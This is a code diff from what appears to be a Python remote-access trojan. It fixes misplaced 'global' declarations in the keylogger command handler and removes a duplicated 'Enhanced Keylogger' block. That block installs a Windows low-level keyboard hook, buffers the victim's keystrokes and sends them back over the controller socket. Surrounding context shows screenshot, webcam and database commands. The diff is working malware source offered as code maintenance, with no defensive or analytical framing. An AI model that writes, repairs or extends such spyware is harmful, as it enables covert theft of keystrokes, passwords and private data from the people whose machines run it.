@@ -1608,8 +1608,8 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     # --- Keylogger Commands ---
+                    global keylogger_active, keylog_buffer
                     if command.lower() == 'keylog_start':
-                        global keylogger_active, keylog_buffer
                         if not keylogger_active:
                             keylogger_active = True
                             keylog_buffer = []
@@ -1653,7 +1653,6 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                             s.send("[!] Keylogger already running\n\n".encode())
                         continue
                     
-                    global keylogger_active
                     if command.lower() == 'keylog_stop':
                         keylogger_active = False
                         s.send("[+] Keylogger stopped\n\n".encode())
@@ -1822,64 +1821,6 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                             s.send("[!] OpenCV not available for webcam\n\n".encode())
                         except:
                             s.send("[!] Webcam capture failed\n\n".encode())
-                        continue
-                    
-                    # --- Enhanced Keylogger ---
-                    global keylogger_active, keylog_buffer
-                    if command.lower() == 'keylog_start':
-                        if not keylogger_active:
-                            keylogger_active = True
-                            keylog_buffer = []
-                            
-                            def keylogger_thread():
-                                global keylogger_active, keylog_buffer
-                                try:
-                                    if IS_WINDOWS:
-                                        import ctypes
-                                        import win32con
-                                        
-                                        def low_level_handler(nCode, wParam, lParam):
-                                            if wParam == win32con.WM_KEYDOWN:
-                                                import struct
-                                                vk_code = struct.unpack('B', lParam)[0]
-                                                import win32api
-                                                key = win32api.GetKeyNameText(vk_code * 0x10000)
-                                                keylog_buffer.append(key)
-                                                if len(keylog_buffer) > 100:
-                                                    keylog_buffer.pop(0)
-                                            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
-                                        
-                                        hook = ctypes.windll.user32.SetWindowsHookExA(13, low_level_handler, None, 0)
-                                        
-                                        while keylogger_active:
-                                            ctypes.windll.user32.GetMessageA(ctypes.c_void_p(), None, 0, 0)
-                                        
-                                        ctypes.windll.user32.UnhookWindowsHookEx(hook)
-                                        
-                                except:
-                                    # Fallback to basic logging
-                                    while keylogger_active:
-                                        keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
-                                        time.sleep(5)
-                                
-                            threading.Thread(target=keylogger_thread, daemon=True).start()
-                            s.send("[+] Keylogger started\n\n".encode())
-                        else:
-                            s.send("[!] Keylogger already running\n\n".encode())
-                        continue
-                    
-                    if command.lower() == 'keylog_dump':
-                        if keylog_buffer:
-                            logs = ''.join(keylog_buffer)
-                            s.send(f"Keylogger Log:\n{logs}\n\n".encode())
-                            keylog_buffer.clear()
-                        else:
-                            s.send("[!] No keylog data\n\n".encode())
-                        continue
-                    
-                    if command.lower() == 'keylog_stop':
-                        keylogger_active = False
-                        s.send("[+] Keylogger stopped\n\n".encode())
                         continue
                     
                     # --- Database Commands ---
